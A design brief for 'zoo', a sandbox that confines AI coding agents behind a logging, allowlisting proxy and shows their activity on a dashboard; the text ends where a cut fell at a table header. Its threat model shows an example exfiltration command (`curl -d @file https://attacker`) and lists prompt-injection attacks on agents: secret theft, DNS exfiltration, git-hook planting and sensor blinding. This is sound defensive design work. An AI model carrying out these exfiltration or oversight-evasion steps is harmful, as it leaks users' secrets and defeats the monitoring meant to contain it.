# zoo: the complete build brief

> **Audience:** an autonomous coding agent working in a goal loop on this repository, plus the human (Dusty) who owns it.
> **Status as of 2026-11-07:** multi-backend (Apple, Docker, Podman), keeper with services and credentials, dashboard; see section 6. This brief takes it to a fully observable agent sandbox. User docs live in the README and `docs/`; this file is the design.
> **Rule zero:** this file is the source of truth for *what* to build and *why*. If code and this brief disagree, the brief wins unless the Decision Log says otherwise. If you change a decision, record it in the Decision Log (section 15) in the same commit.

---

## Contents

1. [How to work this brief (the loop)](#1-how-to-work-this-brief-the-loop)
2. [Mission](#2-mission)
3. [Invariants: things that must never break](#3-invariants-things-that-must-never-break)
4. [Threat model](#4-threat-model)
5. [Glossary](#5-glossary)
6. [Current state](#6-current-state)
7. [Target architecture](#7-target-architecture)
8. [Backends](#8-backends)
9. [The keeper (network)](#9-the-keeper-network)
10. [Cages: lifecycle, mounts, secrets, sharing](#10-cages-lifecycle-mounts-secrets-sharing)
11. [Visibility and telemetry](#11-visibility-and-telemetry)
12. [Dashboard](#12-dashboard)
13. [CLI, config, and integrations](#13-cli-config-and-integrations)
14. [Milestones and acceptance gates](#14-milestones-and-acceptance-gates)
15. [Decision log](#15-decision-log)
16. [Testing strategy](#16-testing-strategy)
17. [Engineering conventions](#17-engineering-conventions)
18. [Open questions](#18-open-questions)
19. [Status tracker](#19-status-tracker)
20. [Appendix: reference facts](#20-appendix-reference-facts)

---

## 1. How to work this brief (the loop)

You are expected to iterate: pick work, build it, prove it, record it, repeat.

### Each iteration

1. **Read** section 19 (Status tracker). Pick the **first unchecked item in the lowest-numbered open milestone** whose dependencies are done. Don't skip ahead unless the current item is blocked; if blocked, mark it `BLOCKED: <reason>` and take the next one.
2. **Plan** in a few lines in your scratch notes (not in this file): what files change, what test proves it.
3. **Build** the smallest change that satisfies the item. Keep v0 behavior working on the Apple backend unless the item says otherwise.
4. **Prove** it: run `make test`, plus the milestone's acceptance gate (section 14). A gate that needs real hardware you don't have (e.g. macOS 26 for Apple `container`) is proven with the fake-backend harness and marked `needs-hw-verify` in the tracker.
5. **Record**: tick the box in section 19, add a one-line entry to the Changelog (section 19.2), and update any section of this brief your change made inaccurate.
6. **Commit** with a message `<milestone>: <what>` (e.g. `M1: docker backend create/exec/list`). One logical change per commit.

### Stop and ask the human when

- An invariant (section 3) would have to bend to make progress.
- A choice is irreversible or expensive and the brief doesn't decide it (new runtime dependency over ~5 MB, a new privileged component, changing on-disk formats users depend on, publishing anything).
- You need credentials, hardware, a paid service, or to push to a remote.
- Two consecutive iterations fail the same gate for reasons you can't diagnose.

Otherwise, don't ask: decide, note the decision in section 15, and keep going.

### Never

- Weaken a security check to make a test pass.
- Put secrets (tokens, keys, passwords) on a command line, in logs, in the image, in the repo, or in test fixtures that look real.
- Disable TLS verification anywhere.
- Delete user data outside `~/.zoo` without an explicit command from the user.
- Mark a gate passed that you didn't run.

---

## 2. Mission

**zoo runs any AI coding agent inside a small, resource-limited, isolated sandbox ("cage") whose only route to the network is a logging, allowlisting proxy ("the keeper"), and shows everything the agent does (network, resources, files, processes, and its own reasoning) on one live dashboard.**

It must work:

- with **any harness** (Claude Code, Codex, pi, opencode, aider, gemini-cli, Amp, anything that runs as a process), with zero cooperation from the harness;
- with **any orchestrator** (Conductor, Orca, herdr, a terminal, a script);
- on **macOS** (Apple silicon first, Intel best-effort), **Linux**, and **Kubernetes**; Windows via WSL2 is a stretch goal;
- with **VM-grade isolation by default** where the host supports it, and an explicit, visible downgrade to container isolation where it doesn't.

Primary user: one developer running several agents in parallel across worktrees. Secondary: a team or homelab running cages on Kubernetes. Built clean enough to open-source.

### Non-goals

- Making the agent's *output* safe. zoo protects the machine and its secrets, not the correctness of code the agent writes.
- Replacing a harness's own permission prompts. zoo is the layer underneath.
- Multi-tenant hosting for untrusted strangers.
- TLS interception of agent traffic in general. Hostname-level control via `CONNECT` is the design. The one exception (D35): hosts the human puts under `credentials:` are decrypted in the keeper so it can add a token the cage never sees and enforce a policy, with a per-install CA name-constrained to exactly those hosts.

---

## 3. Invariants: things that must never break

Every backend, every release. The escape suite (section 16.3) tests these. If a backend can't satisfy one, it must refuse to start cages, or start them only with a loud, explicit, per-run opt-in (`--allow-weaker-isolation`) that the dashboard displays on the cage card.

| # | Invariant |
|---|---|
| I1 | **One way out.** A cage's only network path to the internet is the keeper. No default route, no NAT, no external DNS. |
| I2 | **Keeper outside the blast radius.** The keeper's config, allowlist and logs live outside every cage and can't be modified from inside one. |
| I3 | **Default deny.** A host not on the effective allowlist is refused and logged. There is no allow-all mode: every new host is approved by a human (dashboard Allow or `zoo allow`). Private, loopback, link-local and CGNAT destinations are refused even for allowlisted names (D24). |
| I4 | **Everything logged.** Every request through the keeper is recorded with time, cage (and agent, once M5 lands), method, host, verdict, bytes in/out, duration. |
| I5 | **No host secrets inside.** Nothing from the host enters a cage except the worktree (and, for git worktrees, the repo's git dir). No `$HOME`, SSH keys, cloud creds, keychain, Docker socket, or host env leaks in. |
| I6 | **Worktree secrets masked.** Files matching mask patterns (`.env*`, `*.pem`, `*.key`, `id_*`, `.npmrc`, `.netrc`, …) read as empty inside the cage, and the agent can't unmask them. |
| I7 | **No host code execution via the repo.** `.git/hooks`, `.git/config` (and `config.worktree`) are read-only inside the cage. (Known residual: agent-edited scripts the human later runs. Documented, not prevented.) |
| I8 | **Unprivileged agents.** Agents run as a non-root user. Root in the guest belongs to zoo's init and sensor only. |
| I9 | **Hard resource limits.** Every cage has CPU, memory and pid limits; disk where the backend supports it. |
| I10 | **Credentials scoped and out of argv.** Harness credentials are injected per agent session via env file or stdin, never on a command line, never in images, never logged. Each harness credential is a dedicated, revocable token. |
| I11 | **Dashboard is local and authenticated.** Binds loopback only (or behind auth on k8s), rejects foreign `Host` headers, requires a token header for state changes. Unreachable from cages. |
| I12 | **Isolation level is never silently downgraded.** The effective isolation (vm, microvm, sandboxed-container, container) is shown in `zoo ls`, on the dashboard, and in `zoo doctor`. |

---

## 4. Threat model

**Attacker:** text the agent reads (a web page, issue, PR comment, README, dependency doc, tool output). It can make the agent run arbitrary commands as the agent user inside the cage. Assume the attacker may also obtain root inside the guest by exploiting the guest kernel or a misconfiguration.

| Attack | Example | Control |
|---|---|---|
| Secret theft | read `.env`, `~/.ssh`, cloud creds | I5, I6 |
| Exfiltration | `curl -d @file https://attacker` | I1, I3, I4; bytes-out alerts |
| Exfil via allowed host | post code to a gist with the attacker's own GitHub token | Narrowed by allowlist; detected by per-host bytes-out alert and request log. **Not prevented.** |
| DNS exfil | encode data in lookups | I1 (no resolver in cage); DNS attempts logged as a signal (M8) |
| Host tampering | plant a git hook or `core.fsmonitor` that runs on the host | I7; worktree paths named by git config read-only (D32) |
| Config tampering | edit `zoo.yaml` to grant itself services, unmask secrets or add mounts | only a human-approved copy is used (D31) |
| Pre-existing payload | a downloaded repo ships `.git/hooks/pre-commit` | listed at cage creation and in doctor (D32); detection only |
| Credential theft | read `GH_TOKEN` and use it elsewhere | with `credentials:`, the cage holds a placeholder bound by HMAC to it (D35) |
| Persistence | poison shell rc, harness settings, caches for the next session | ephemeral guest home and root; `zoo reset`; shared caches read-only or per-project |
| Resource abuse | mining, fork bomb, fill disk | I9, alerts on sustained limits |
| Lateral movement | reach the host's services or other cages | separate networks per cage group; host-port exposure check in doctor |
| Escape | guest kernel exploit | VM / microVM isolation by default (I12) |
| Dashboard abuse | a web page in the user's browser POSTs to the dashboard | I11 |
| Sensor blinding | root in guest kills the in-guest sensor | events stream out immediately; heartbeat loss is an alert (section 11.4) |

**Known accepted risks** (document in README, don't silently "fix" by weakening something else):

- The harness's model credential is inside the cage by design.
- Agent-modified code (scripts, tests, `package.json`) may later run on the host when the human runs it.
- On Apple `container`, the host gateway IP is reachable from internal networks ([apple/container#1320](https://github.com/apple/container/issues/1320)); host services bound to `0.0.0.0` are visible to cages. `zoo doctor` reports exposed ports.

---

## 5. Glossary

| Term | Meaning |
|---|---|
| **cage** | One isolated sandbox (VM, microVM or container) bound to one worktree. Can host several agent sessions. |
| **keeper** | The egress proxy (squid). The only route out of any cage. |
| **zood** | The host daemon: tails keeper logs, polls resources, runs sentinel rules, stores telemetry, serves the dashboard. (v0: `zoo daemon` subcommand.) |
| **backend** | The runtime that creates cages: `apple`, `docker` (incl. OrbStack, Docker Desktop, Podman, colima), `kata`/`gvisor` runtimes under docker/containerd, `k8s`, `lima`, `firecracker`. |
| **isolation level** | `vm` (own kernel, full VM), `microvm` (own kernel, minimal VMM), `sandboxed-container` (gVisor), `container` (shared kernel). |
| **harness** | An agent CLI (Claude Code, Codex, pi, …). |
| **session** | One harness process running in a cage. |
| **shim** | A script on `PATH` named like a harness (`claude`) that runs it inside the right cage. |
| **learn mode** | Removed (D24). Was per-cage allow-all-and-log; replaced by approving blocked hosts by hand (`zoo blocked`, dashboard Allow). |
| **sentinel** | The rule engine that raises alerts. |
| **escape suite** | The set of checks proving the invariants hold (`zoo doctor`, extended). |
| **door** | A way an orchestrator reaches a cage: shim, SSH, or direct. |

---

## 6. Current state

As of 2026-11-07: Apple, Docker and Podman backends, on macOS, Linux and Windows (Docker Desktop); keeper with allowlist, gate and credential injector; services and grants; the worktree guard; dashboard; doctor. User-facing docs: [README](../README.md), [getting started](getting-started.md), [guide](guide.md), [how it works](how-it-works.md), [security](security.md). This section is the map for whoever builds next.

### 6.1 Repository layout

```
cmd/zoo/                   CLI, one file per area: main.go (up/run/prepare/doctor/allow…),
                           backend.go, services.go, trust.go, doctor.go, ssh.go, preview.go,
                           cache.go, image.go
assets/images/
  cage/                    Dockerfile (node:22-bookworm-slim + git, rg, python3, uv, socat,
                           openssh-server, claude-code, codex; user "agent" = host uid/gid),
                           zoo-init (PID 1), zoo-session (per-session wrapper: ssh-agent relay),
                           zoo-doctor (escape suite), sshd_config (SSH door)
  cage-overlay/            what zoo adds on top of a user's image (zoo-setup, overlay.Dockerfile)
  keeper/                  Dockerfile (squid + zoo-gate), keeper-entrypoint,
                           gate/ (stdlib Go: service gate + credential injector)
internal/
  backend/                 Backend interface; apple/, docker/ (docker|podman), dockerapi/ (Engine API
                           client zood uses), guest paths for Windows; contract/ suite
  cage/                    plan (root, masks, git guard, pins, mounts, cache, image), git traps
                           and risks, list/find
  config/                  config.yaml, zoo.yaml + trust, durations, default masks
  gitrefs/                 ref snapshots; "branch moved" reports (zoo refs)
  proc/                    OS differences for zoo's processes (detach, no console windows)
  keeper/                  squid.conf, allowlist + expiries, access log
  services/                services, grants + expiries, gate.json, in-cage names
  inject/                  credentials: placeholders, CA, keeper files, cage trust setup
  daemon/                  zood: log tails, stats, alerts, host bridge, previews, SSE API,
                           web/index.html
  sshagent/, sshdoor/      filtering SSH-agent proxy; SSH door
  images/                  custom cage images, Dockerfile approval
  keys/                    Keychain / file secrets; Bitwarden, 1Password refs
  shims/, paths/, jsonx/
test/fakes/                fake container/docker/podman CLIs with recorded state
docs/                      user docs, architecture.md (diagrams), this brief
```

### 6.2 How it works

See [how-it-works.md](how-it-works.md) for the narrative and [architecture.md](architecture.md) for the trust boundaries and sequence diagrams. In one paragraph: `zoo up` builds images, creates internal networks, starts the keeper (squid + zoo-gate + injector) dual-homed, and starts zood. `zoo run` plans the cage, creates or starts it (host-side read-only mounts, all capabilities dropped, no DNS), syncs the gate and injector, applies in-cage names and CA trust as guest root, writes session secrets to a 0600 env file, and execs the harness through zoo-session as `agent`. zood tails access/gate/inject logs, attributes by cage IP, samples stats, raises alerts, expires temporary allows and grants, answers the host bridge (host services, SSH agents, credential values), and serves the dashboard and previews on loopback.

### 6.3 Tested

- Unit and fake-runtime tests (`go test ./...`), the contract suite over apple/docker/podman fakes, gate and injector tests with real TLS and a real `git push`.
- CI on every push: gofmt, vet, tests, shellcheck; the whole suite natively on Windows; the Engine API path against real Docker and Podman; the escape suite (`zoo doctor`) in a real Docker cage on Linux, main checkout and linked worktree, including masks in build output and a moved branch being reported.
- By hand: Apple 1.6.1 and OrbStack (M0–M2S, see 19.2); Docker Desktop for the 2026-11-07 pass (credentials, trust, doctor --deep, expiry, SSH door, previews, git modes, mounts, custom images). Apple not re-verified since D31.

### 6.4 Apple hardware verification (M0, kept for reference)

**Status (2026-10-28, container 1.6.1 on macOS 27.0.1):** two networks via repeated `--network` ✓; `exec --env-file` ✓ (quotes kept literally) and exec inherits `run -e` ✓; in-guest bind/remount ✗ (no CAP_SYS_ADMIN: replaced by host-side mounts, D11); virtiofs ownership ✓ (guest sees root:root and doesn't enforce modes, host sees your uid); stats fields ✓ (`cpuUsageUsec` cumulative µs, `memoryUsageBytes`, `memoryLimitBytes`, `networkRxBytes`, `networkTxBytes`, `blockReadBytes`, `blockWriteBytes`, `numProcesses`); `build --build-arg` ✓; squid writes the virtiofs log dir ✓; harnesses honoring `HTTPS_PROXY` (not yet: needs tokens). Also learned: IPs change on restart; no `--pids-limit` (use `--ulimit nproc`); `image inspect` works for existence; `-u nosuchuser` leaves a stale exec record that blocks `delete --force` until `stop`.


- Keeper joining two networks via repeated `--network`.
- `container exec --env-file` behavior and env inheritance from `run -e`.
- `zoo-init` bind/remount inside Apple's guest (needs CAP_SYS_ADMIN in the guest's root).
- virtiofs ownership with `AGENT_UID`/`AGENT_GID` build args (Mac uid 501, gid 20).
- `container stats --format json` field names (daemon uses heuristics: see `internal/daemon/stats.go`).
- `container build --build-arg` support.
- Squid writing to a virtiofs-mounted log dir as user `proxy`.
- Claude Code and Codex honoring `HTTPS_PROXY` with an IP-literal proxy and no DNS in the cage.

### 6.5 Known limitations (each is scheduled in section 14)

- Approved project allowlists replace the global list (D43). Per-harness policy layering beyond `allow:` remains outside this version (M2).
- Attribution per cage IP, not per agent (M5).
- Recent web history has a JSON checkpoint (D44). The full telemetry store and service-event persistence remain open (M3).
- No file watcher, in-guest sensor, harness OTel ingestion or AG-UI timeline (M4, M7, M8).
- Apple cages share one network and see the host gateway (apple/container#1320).
- No disk limit; no Docker-in-cage (M4, M6).
- Dashboard is a single static HTML page, not React (M7).
- `zoo.yaml`'s `harness:` key is parsed but unused.

---

## 7. Target architecture

```
                    orchestrators: Conductor · Orca · herdr · terminal · scripts
                           │ shim                 │ SSH                 │ direct
                           ▼                      ▼                     ▼
┌──────────────────────────────── host ───────────────────────────────────────────┐
│  zoo CLI ──► zood (daemon)                                                       │
│               ├─ Backend driver (apple | docker[runc|runsc|kata] | lima | k8s | fc)│
│               ├─ Keeper manager (squid config, allowlists, reload)               │
│               ├─ Ingest: keeper log · resource sampler · file watcher ·          │
│               │          guest sensor (vsock) · harness OTel (OTLP)              │
│               ├─ Correlator + sentinel (rules → alerts → ntfy/Slack)             │
│               ├─ Store (DuckDB/SQLite, retention)                                │
│               ├─ AG-UI translator (per-session event streams)                    │
│               └─ API + dashboard (loopback; token)                               │
│                                                                                  │
│   isolated cage network (no internet, no DNS) ──────────► keeper ──► allowlisted │
│   ┌ cage A (VM) ┐  ┌ cage B (VM, shared) ┐                (squid)     internet   │
│   │ agent-1     │  │ agent-1  agent-2    │                                       │
│   │ sensor      │  │ sensor              │                                       │
│   └─────────────┘  └─────────────────────┘                                       │
└──────────────────────────────────────────────────────────────────────────────────┘
```

### 7.1 Components

| Component | Language | Responsibility |
|---|---|---|
| `zoo` | Go | CLI. Thin: talks to `zood` over a local API for everything stateful once M3 lands; may call the backend directly for `up`. |
| `zood` | Go | Long-running daemon (launchd agent on macOS, systemd user unit on Linux, Deployment on k8s). Owns backend driver, keeper, ingest, store, sentinel, API. |
| keeper | squid (config generated by Go) | Egress control + logging. Placement varies by backend (section 9.2). |
| cage image | Dockerfile (OCI) | Same image for every backend. Agents + toolchain + `zoo-init` + `zoo-sensor`. |
| `zoo-init` | POSIX sh (→ small Go binary at M8) | Guest PID 1: masks, read-only paths, user setup, sensor start, idle/reap. |
| `zoo-sensor` | Go, in guest | Tetragon client or own eBPF; streams process/file/connect events + heartbeat over vsock (or host-only TCP). |
| dashboard | v0: static HTML. M7+: TypeScript + React, built with Vite, embedded via `go:embed` | Views in section 12. AG-UI client for sessions. |

### 7.2 The backend interface (Go)

All backend-specific code lives behind this interface in `internal/backend/`. v0's `internal/ctr` becomes `internal/backend/apple`.

```go
package backend

type Isolation string

const (
    IsoVM          Isolation = "vm"
    IsoMicroVM     Isolation = "microvm"
    IsoSandboxed   Isolation = "sandboxed-container" // gVisor
    IsoContainer   Isolation = "container"
)

type Capabilities struct {
    Isolation            Isolation
    InternalNetworks     bool // can create a network with no route out
    HostGatewayReachable bool // cages can reach host IP on that network (Apple: true)
    MultiNetworkAttach   bool // one instance on two networks (keeper dual-homing)
    HostFileMounts       bool // can bind a single host file (for host-side masking)
    ReadOnlyMounts       bool
    GuestMountCap        bool // guest root can bind/remount (for in-guest masking)
    Vsock                bool
    DiskLimit            bool
    PerCageKernel        bool
    DockerInCage         bool // safe to run dockerd inside a cage
}

type Backend interface {
    Name() string
    Detect(ctx context.Context) (Capabilities, error) // installed? running? version?
    Prepare(ctx context.Context) error                 // start services, kernels, etc.

    ImageExists(ctx context.Context, ref string) (bool, error)
    BuildImage(ctx context.Context, spec ImageSpec) error

    EnsureCageNetwork(ctx context.Context, spec NetSpec) (NetInfo, error)
    EnsureKeeper(ctx context.Context, spec KeeperSpec) (Endpoint, error) // returns proxy addr reachable from cages

    CreateCage(ctx context.Context, spec CageSpec) error
    StartCage(ctx context.Context, id string) error
    StopCage(ctx context.Context, id string) error
    DeleteCage(ctx context.Context, id string) error
    ListCages(ctx context.Context) ([]CageStatus, error) // includes keeper with Role=keeper
    Exec(ctx context.Context, spec ExecSpec) (int, error) // attached; returns exit code
    WriteFile(ctx context.Context, id, path string, data []byte, uid int) error
    Sample(ctx context.Context) ([]ResourceSample, error) // cpu%, mem used/limit, net rx/tx, blk, pids
}
```

`CageSpec` carries: id, name, labels, image, size (cpus, memory, disk, pids), network, mounts (rw, ro), masks, read-only paths, env (non-secret), runtime hint (`runc|runsc|kata`). The backend chooses **host-side masking** (bind empty file `:ro`) when `HostFileMounts`, else **guest-side masking** via `zoo-init` when `GuestMountCap`, else refuses (I6).

### 7.3 Data model (store)

Tables (DuckDB preferred; SQLite acceptable if DuckDB cgo is a problem for cross-compiling; record choice in section 15):

- `cages(id, name, backend, isolation, worktree, size, created_at, deleted_at, labels json)`
- `sessions(id, cage_id, agent_user, harness, host_pid, started_at, ended_at, exit_code)`
- `net_events(ts, cage_id, agent, client_ip, method, host, url, status, squid_code, bytes_in, bytes_out, ms, denied, allowlisted, first_seen)`
- `resource_samples(ts, cage_id, cpu_pct, mem_used, mem_limit, net_rx, net_tx, blk_r, blk_w, pids)`
- `file_events(ts, cage_id, path, op, size, sha256?)`
- `proc_events(ts, cage_id, agent, pid, ppid, uid, exe, argv_redacted, op)` (M8)
- `agent_events(ts, session_id, kind, payload json)` (harness OTel, normalized)
- `alerts(id, ts, level, cage_id, rule, title, body, evidence json, acked_at)`
- `allow_rules(host, scope[global|harness:X|project:path], added_by, added_at, reason)`

Retention: default 30 days, configurable; resource samples downsampled after 24 h.

---

## 8. Backends

Priority order (build in this order): **apple → docker (runc) → docker+runsc / docker+kata → k8s+kata → lima → firecracker**. Each backend must pass the escape suite (section 16.3) for its declared capabilities before it's marked done.

### 8.0 Backend selection

- `zoo backend` prints detected backends, their isolation level and readiness.
- Config `backend: auto|apple|docker|k8s|lima|firecracker` and `runtime: auto|runc|runsc|kata`.
- `auto` picks the strongest ready option: on macOS 26+ Apple silicon with `container` installed → `apple`; on Linux with Kata configured → `docker`+`kata`; Linux with gVisor → `docker`+`runsc`; else `docker`+`runc` **only if** the user opted in to container isolation (`isolation_floor: container` in config), otherwise refuse with an explanation (I12).
- Default `isolation_floor: microvm`. On macOS, Docker Desktop/OrbStack run containers inside one Linux VM: report isolation `container` (shared kernel among cages), not `vm`.

### 8.1 `apple` (macOS 26+, Apple silicon) — v0

| Concern | Mechanism |
|---|---|
| Isolation | VM per cage (Virtualization.framework) |
| Network | `container network create --internal zoo-cages`; keeper on `default` + `zoo-cages` |
| DNS | `--no-dns` on cages |
| Masks / git guard | guest-side via `zoo-init` (verify CAP_SYS_ADMIN) or host-side `--mount type=…,readonly` if file mounts work |
| Limits | `-c`, `-m`; disk: TBD |
| Stats | `container stats --format json --no-stream` |
| Exec | `container exec -i -t -u agent -w … --env-file …` |
| Known gap | host gateway reachable (#1320); pf doesn't filter vmnet; watch upstream for `--internal` hardening / `container system pf` |

### 8.2 `docker` (Docker Engine, Docker Desktop, OrbStack, colima, Podman)

One driver, CLI-compatible with `docker` and `podman` (`ZOO_DOCKER_BIN`). Prefer shelling out over the Docker SDK to keep deps small and support Podman; revisit if JSON shapes become painful (record in 15).

| Concern | Mechanism |
|---|---|
| Isolation | `runc` → `container`; `--runtime runsc` → `sandboxed-container`; `--runtime kata`/`io.containerd.kata.v2` → `microvm` |
| Network | `docker network create --internal zoo-cages`; keeper: `docker run --network bridge …` then `docker network connect zoo-cages zoo-keeper` |
| DNS | Docker's embedded DNS answers on internal networks; **verify** external names don't resolve (doctor check). If they do, run cages with `--dns 127.0.0.1` (nothing listening) and confirm. |
| Hardening | `--cap-drop ALL --security-opt no-new-privileges --read-only --tmpfs /tmp --tmpfs /home/agent --pids-limit N --memory --cpus`; no Docker socket mount, ever |
| Masks | host-side: `-v ~/.zoo/empty:<path>:ro` per masked file (needs no guest caps) |
| Git guard | host-side `:ro` mounts of `.git/hooks`, `.git/config` layered over the rw repo mount |
| Agent user | `--user <uid>:<gid>` matching host for bind-mount ownership; image keeps `agent` home writable via tmpfs |
| Stats | `docker stats --no-stream --format '{{json .}}'` (CPUPerc, MemUsage, NetIO, BlockIO, PIDs) |
| Exec | `docker exec -i -t -u … -w … --env-file …` |
| Host exposure | Linux: internal bridge still has a host-side IP? Verify; add nftables guidance if host is reachable. macOS: host reachable via the VM; doctor reports. |

Notes:
- `zoo-init` must tolerate `--cap-drop ALL` (masks done host-side; script must skip mounting and just idle).
- On macOS with OrbStack/Docker Desktop, cages share one Linux kernel: show isolation `container`.
- Podman rootless: `--network` internal semantics differ (netavark); verify and document.

### 8.3 `docker` + `kata` / `runsc` (Linux)

Same driver as 8.2 with a runtime flag. This is the **default Linux path to microVM isolation** without writing a Firecracker driver.

- Detect: `docker info --format '{{json .Runtimes}}'` contains `kata`/`kata-runtime`/`io.containerd.kata.v2` or `runsc`.
- Kata on a VM host (e.g. a Proxmox guest) needs nested virtualization; `zoo backend` must explain how to enable it when missing.
- gVisor (`runsc`) as the middle option when KVM isn't available.
- Vsock: Kata exposes vsock to the host; gVisor doesn't. Sensor transport falls back to host-only TCP on the cage network (keeper-side listener) when vsock is absent.

### 8.4 `k8s` (+ Kata RuntimeClass)

Remote cages for a homelab (k3s on Proxmox) or a team cluster.

| Concern | Mechanism |
|---|---|
| Isolation | Pod with `runtimeClassName: kata` (microvm); `gvisor` allowed; plain runc only with `isolation_floor: container` |
| Worktree | **No local bind mount.** Cage gets a PVC; `zoo run --backend k8s` clones the repo (branch) into it, or syncs via `zoo sync` (git bundle push/pull over `kubectl exec`). Agents commit inside; the human pulls results with `zoo pull` (fetch from the cage's repo over the SSH door or a git bundle). |
| Network | Namespace `zoo`; default-deny egress `NetworkPolicy`; allow egress only to `zoo-keeper` Service :3128 (and kube-dns only if needed by the keeper, never by cages). Keeper as a Deployment with egress allowed. Cilium optional; if present, Hubble flows are an additional source. |
| Secrets | Harness credentials as k8s Secrets mounted only into the session's exec env (not the pod spec env), or injected at exec via stdin. |
| Limits | Pod resources requests/limits; ephemeral-storage limit; pids via kubelet config doc. |
| Exec | `kubectl exec -it` via client-go (SPDY/WebSocket). |
| Stats | metrics-server or kubelet summary API. |
| Dashboard | Runs in-cluster behind auth (OIDC proxy or token); `zoo dash --remote` port-forwards. |
| Packaging | Helm chart `charts/zoo`: zood, keeper, RBAC, NetworkPolicy, RuntimeClass (optional), PVC template. |

### 8.5 `lima` (macOS < 26, Intel Macs)

Fallback when Apple `container` isn't available. Two modes; choose one in M9 and record why:
- **VM per cage**: a Lima instance per cage from the cage image (slower boot, strongest).
- **Shared Lima VM with docker+runsc inside**: one Linux VM running the docker backend with gVisor.

### 8.6 `firecracker` (Linux, optional)

Only if docker+kata proves insufficient (startup time, control). Driver uses `firecracker-go-sdk`, a rootfs built from the cage OCI image, a TAP per cage on a dedicated bridge with **no NAT** and nftables allowing only the keeper; keeper runs as a host process or its own microVM; vsock for sensor.

### 8.7 Windows (stretch)

WSL2 + docker backend. Document limits; no work until M11.

---

## 9. The keeper (network)

### 9.1 squid configuration (current, keep compatible)

```
http_port 3128
cache deny all
acl SSL_ports port 443
acl Safe_ports port 80 443
acl CONNECT method CONNECT
acl zoo_allowed dstdomain "/etc/zoo/allowlist.txt"
acl zoo_private_name dstdomain -n .localhost .internal .local
acl zoo_private dst 0.0.0.0/8 10.0.0.0/8 100.64.0.0/10 127.0.0.0/8 169.254.0.0/16 172.16.0.0/12 192.0.0.0/24 192.168.0.0/16 198.18.0.0/15 224.0.0.0/3
acl zoo_private dst ::1/128 64:ff9b::/96 fc00::/7 fe80::/10 ff00::/8
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access deny zoo_private_name
http_access deny zoo_private
http_access allow zoo_allowed
http_access deny all
logformat zoo %ts.%03tu %>a %rm %ru %>Hs %Ss %<st %>st %tr
access_log stdio:/var/log/zoo/access.log zoo
via off
forwarded_for delete
```

Log line fields (space-separated): `epoch.ms client method url status squid_code bytes_to_client bytes_from_client ms`. The parser lives in `internal/keeper` and must stay backward compatible; if you add fields, append them and keep the first nine.

### 9.2 Keeper placement per backend

| Backend | Placement | Cages reach it at |
|---|---|---|
| apple | its own VM on `default` + `zoo-cages` | keeper IP on `zoo-cages` |
| docker | container on `bridge` + `zoo-cages` | keeper IP / alias on `zoo-cages` |
| k8s | Deployment + Service in `zoo` ns | `zoo-keeper.zoo.svc:3128` (cages get the ClusterIP, not DNS, unless kube-dns is allowed for keeper only) |
| lima / firecracker | host process or own VM bound to the cage bridge IP | bridge IP |

The keeper's IP must be stable for running sessions. Target: a fixed address on the cage network (docker `--ip`, k8s ClusterIP). Where impossible (Apple), sessions get the current IP at exec time and `zoo up` warns when it moved.

### 9.3 Allowlists (layered) — M2

Effective allowlist for a request = **global ∪ harness(es) running in the cage ∪ project (cage's worktree)**. Implementation: squid ACLs per cage source IP:

```
acl cage_<name> src <ip>/32
acl allow_<name> dstdomain "/etc/zoo/cages/<name>.txt"
http_access allow cage_<name> allow_<name>
```

Regenerated on cage start/stop and on rule changes; `squid -k reconfigure` (no dropped sessions). Each rule records scope, who added it (cli/dashboard), when, optional reason. The dashboard's Allow button offers **this project** (default) or **everywhere**.

### 9.4 Per-agent identity — M5

Each agent session gets a random proxy credential; `HTTPS_PROXY=http://<agent-id>:<secret>@keeper:3128`. squid `auth_param basic` with an htpasswd file zood maintains (`basic_ncsa_auth`, APR1 hashes; generator in Go, test against `openssl passwd -apr1`). Log `%un`. Unauthenticated requests from a cage are denied once all harnesses are verified to support proxy auth (Claude Code, Codex, git, npm, pip, uv, curl). Until then, fall back to per-cage attribution with a dashboard note.

### 9.5 Learn mode (removed)

Removed in D24. A new repo's first run hits walls; the human approves blocked hosts with the dashboard's Allow or `zoo blocked` + `zoo allow`. The keeper reloads on every approval, so agents just retry.

### 9.6 Upgrades beyond squid (only with a Decision Log entry)

- A Go-native CONNECT proxy embedded in zood would remove the keeper VM on some backends and give per-agent identity natively. Not now: squid was explicitly chosen by the owner. Revisit if squid blocks M5 or k8s.

---

## 10. Cages: lifecycle, mounts, secrets, sharing

### 10.1 Lifecycle

- One cage per worktree (`zoo-<slug>-<sha1(root)[:6]>`), persistent while the worktree exists; guest root and agent home are reset on `zoo reset` (and, on backends with `--read-only`, on every start).
- `zoo run` creates/starts the cage, then execs a session. Multiple sessions share the cage.
- `zoo gc` (M2): deletes cages whose worktree no longer exists (ask before deleting; `--yes` to skip).
- Size changes restart the cage (worktree untouched) after confirming.

### 10.2 Mounts

- Worktree root: rw at the same absolute path inside the guest (so paths in logs, errors and tool output match the host).
- Git worktrees: the main repo's common git dir rw at its real path (objects, refs); `hooks/`, `config`, `config.worktree` read-only.
- Nothing else from the host. Shared package caches (npm, pip, uv, go) only as **per-project** volumes owned by zoo, never host caches; read-only when shared across cages.

### 10.3 Masks

Default patterns: `.env`, `.env.*`, `*.pem`, `*.key`, `*.p12`, `id_rsa*`, `id_ed25519*`, `.npmrc`, `.pypirc`, `.netrc`. Unmask: `.env.example`, `.env.sample`, `.env.template`, `*.pub`. Per-repo `mask:`/`unmask:` in `zoo.yaml`. Discovery walks to depth 6, skipping `node_modules`, `.git`, `vendor`, `.venv`, `venv`, `dist`, `build`, `target`, `.next`, `.turbo`, `.cache`; cap 256 files. **New files created after cage start are not masked** (they're the agent's own); files created on the host after start are picked up on next start; M4's file watcher alerts when a new file matching a mask pattern appears while a cage runs.

### 10.4 Credentials

- Stored in the OS secret store: macOS Keychain (service `zoo`), Linux Secret Service via `secret-tool` with 0600-file fallback, k8s Secrets.
- Mapped per harness in config (`env: {VAR: item}`, `files: {relpath: item}`).
- Injected at exec: env file 0600 in `~/.zoo/tmp`, deleted within seconds; files via stdin to `sh -c 'umask 077; cat > path'`.
- `zoo keys ls` shows presence, never values.

### 10.5 Shared cages and per-agent users — M5

- Each session gets its own guest user (`agent-<n>`), home, and credentials readable only by that user; the worktree is group-writable for an `agents` group.
- Per-agent cgroup inside the guest for CPU/memory share; the cage size stays the hard cap.
- Per-agent proxy identity (9.4) and per-agent allowlist overrides (e.g. a reviewer limited to the model API).
- Rule of thumb in docs: share a cage only between agents that read the same kind of input; anything browsing the web gets its own cage.

### 10.6 Sizes

| Size | CPUs | Memory | Disk | Pids |
|---|---|---|---|---|
